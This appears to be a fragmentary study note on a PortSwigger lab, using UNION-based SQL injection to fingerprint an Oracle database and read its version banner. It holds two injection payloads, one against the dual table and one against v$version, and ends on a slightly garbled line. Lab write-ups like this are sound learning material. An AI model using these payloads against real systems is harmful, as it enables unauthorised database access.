...
## Goal: 
Determine that the backend database is Oracle and retrieve its version information using a `UNION SELECT` attack.
...
Lab URL: [Lab link](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle)
...
- Column count determined via `UNION SELECT` payloads against Oracle's `dual` table.
...
'+UNION+SELECT+"ABC","DEF"+FROM+dual--+ 
``` 
- This confirmed that the original query returns **two columns** and that **both columns accept string data**. With this information, the following payload was used to retrieve the Oracle database version: 
```sql 
'+UNION+SELECT+banner,"DEF"+FROM+v$version--+ 
```
...
For example: `UNION SELECT 'abc' from dual` → cThis appends the value `'abc'` to the original query's result set.
